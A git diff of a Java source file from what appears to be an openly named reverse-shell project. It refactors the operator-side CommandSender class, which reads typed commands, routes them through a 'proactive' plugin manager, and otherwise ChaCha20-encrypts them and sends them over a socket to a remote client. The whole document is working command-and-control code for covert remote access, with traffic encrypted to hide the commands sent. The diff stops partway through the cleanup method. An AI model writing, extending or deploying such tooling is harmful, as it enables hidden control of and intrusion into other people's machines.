@@ -1,72 +1,90 @@
-package obs1d1anc1ph3r.reverseshell.server;
+package obs1d1anc1ph3r.reverseshell.server.commandhandling;
 
-import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;
+import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;
 
 import java.io.*;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import obs1d1anc1ph3r.reverseshell.server.plugins.proactive.ProactiveCommandPlugin;
+import obs1d1anc1ph3r.reverseshell.server.plugins.proactive.ProactivePluginManager;
 
 public class CommandSender implements Runnable {
 
 	private static final Logger logger = Logger.getLogger(CommandSender.class.getName());
 	private final DataOutputStream dataOut;
 	private final BufferedReader userInput;
-	private final ReverseShellServer server;
 	private final byte[] encryptionKey;
+	private final ProactivePluginManager proactivePluginManager;
 
-	public CommandSender(DataOutputStream dataOut, BufferedReader userInput, ReverseShellServer server, byte[] encryptionKey, byte[] nonce) {
+	public CommandSender(DataOutputStream dataOut, BufferedReader userInput, byte[] encryptionKey, byte[] nonce) {
 		this.dataOut = dataOut;
 		this.userInput = userInput;
-		this.server = server;
 		this.encryptionKey = encryptionKey;
+		this.proactivePluginManager = new ProactivePluginManager();
 	}
 
 	@Override
 	public void run() {
 		try {
-			String command;
-			System.out.print("\nCommand> "); //Just the first one of these, the rest are handled in other places for formatting reasons
-			while ((command = userInput.readLine()) != null) {
-				if ("exit".equalsIgnoreCase(command)) {
-					sendCommand("exit");
-					server.cleanup();
-					break;
-				} else {
-					sendCommand(command);
-				}
-			}
+			handleUserInput();
 		} catch (IOException e) {
 			logger.log(Level.SEVERE, "[ERROR] Error reading command input: " + e.getMessage(), e);
+		} catch (Exception ex) {
+			logger.log(Level.SEVERE, "[ERROR] Unexpected error: ", ex);
 		} finally {
 			cleanup();
 		}
 	}
 
-	//Do the thing
-	private void sendCommand(String command) {
-    try {
-        if (dataOut != null) {
-            byte[] nonce = ChaCha20.generateNonce();
-            byte[] encryptedCommand = ChaCha20.encrypt(encryptionKey, nonce, command.getBytes());
+	private void handleUserInput() throws IOException, Exception {
+		System.out.print("\nCommand> "); // First prompt
+		while (true) {
+			String command = userInput.readLine();
+			if (command == null) {
+				return;
+			}
 
-            dataOut.writeInt(nonce.length + encryptedCommand.length); //Stupid hat
-            dataOut.write(nonce); //Stupid hat
-            dataOut.write(encryptedCommand); //Encrypted command
-            dataOut.flush(); //You better
+			CheckForPlugin(command);
+		}
+	}
 
-            //logger.info("[-] Command sent (encrypted)");
-        } else {
-            logger.severe("[ERROR] Output stream is closed. Unable to send command.");
-        }
-    } catch (IOException e) {
-        logger.log(Level.SEVERE, "[ERROR] Error sending command: " + e.getMessage(), e);
-    } catch (Exception ex) {
-        logger.log(Level.SEVERE, "[ERROR] Encryption error: ", ex);
-    }
-}
+	public void CheckForPlugin(String command) throws Exception {
+		String baseCommand = command.split(" ")[0].toLowerCase();
+		ProactiveCommandPlugin proactive = proactivePluginManager.getPluginProactive(baseCommand);
+		executePlugin(proactive, command);
 
+	}
 
-	private void cleanup() {
+	public void executePlugin(ProactiveCommandPlugin proactive, String command) {
+		try {
+			proactive.execute(dataOut, encryptionKey, this, command);
+		} catch (Exception ex) {
+			sendCommand(command);
+		}
+	}
+
+	public void sendCommand(String command) {
+		if (dataOut == null) {
+			logger.severe("[ERROR] Output stream is closed. Unable to send command.");
+			return;
+		}
+
+		try {
+			byte[] nonce = ChaCha20.generateNonce();
+			byte[] encryptedCommand = ChaCha20.encrypt(encryptionKey, nonce, command.getBytes());
+
+			dataOut.writeInt(nonce.length + encryptedCommand.length);
+			dataOut.write(nonce);
+			dataOut.write(encryptedCommand);
+			dataOut.flush();
+		} catch (IOException e) {
+			logger.log(Level.SEVERE, "[ERROR] Error sending command: " + e.getMessage(), e);
+		} catch (Exception ex) {
+			logger.log(Level.SEVERE, "[ERROR] Encryption error: ", ex);
+		}
+	}
+
+	public void cleanup() {
 		try {
 			if (dataOut != null) {
 				dataOut.close();
